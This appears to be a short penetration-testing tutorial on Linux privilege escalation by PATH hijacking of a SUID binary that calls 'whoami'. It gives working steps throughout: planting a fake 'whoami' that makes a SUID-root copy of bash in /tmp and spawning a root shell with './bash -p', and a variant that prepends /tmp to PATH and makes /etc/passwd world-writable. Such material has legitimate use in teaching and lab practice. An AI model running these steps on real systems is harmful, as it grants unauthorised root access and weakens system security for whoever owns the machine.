Privilege Escalation through Path Hijacking occurs when an attacker is able to place a malicious executable with the same name as a trusted program earlier in the PATH order, 
they can trick the system into running the malicious executable instead of the legitimate one.

**Note:** These techniques rely on the SUID bit being set on the binary and require execution with elevated privileges.

**If there's a binary which contains the following code:**
```
int main (void) {
 set gid(0);
 set uid(0);
 system(“whoami”);
}
```
This binary, without the SUID bit set, will run as the user executing it. 
For example, if the binary is run as root, the output of the whoami command will show "root". 
However, if the SUID bit is set on the binary, it will always run as root, regardless of the user running it.

**Use the strings command to check the contents of a binary for any known commands that may be useful:**
```
strings user_hello
```
In the output, we need to look for any familiar command. 
For example, In the output of this command we will find, system setuid setgid and whoami commands

**The $PATH environment variable contains a list of directories that the system searches when trying to locate executable files.**
```
echo $PATH
```
For example, in the output 
```/home/user1/.local/bin:/home/user1/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin```
It means that it will search for the binary first in “/home/user1/.local/bin”, then “/home/user1/bin” and so on.

**Find a directory where you have write permissions, such as:**
```cd /home/user1/.local/bin```

**Create a custom binary named whoami in this directory:**
```
vim whoami

#!/bin/bash
cp /usr/bin/bash /tmp/bash 
chmod 4777 /tmp/bash
```
**Make it executable:**
```chmod +x whoami```

**When executing user_hello, it follows the $PATH order and runs this custom 'whoami' first.**
```
./user_hello

ls -lh /tmp/
cd /tmp/
./bash -p
id
sudo su - 
```

**If the $PATH variable does not include a writable directory, or if the writable directory appears last in the list, you can modify the $PATH to prioritize a directory you control.**
```
export PATH=/tmp:$PATH
echo $PATH
```
Now, /tmp is the first directory searched when executing commands.

**Navigate to /tmp and create a script named whoami:**
```
vim whoami
```
**Add the following content to the script:**
```
#!/bin/bash
chmod 777 /etc/passwd
```
**Save the file and make it executable:**
ls -lh /tmp/whoami
```
chmod +x whoami
```
**Finally, run the binary:**
```
./user_hello
```
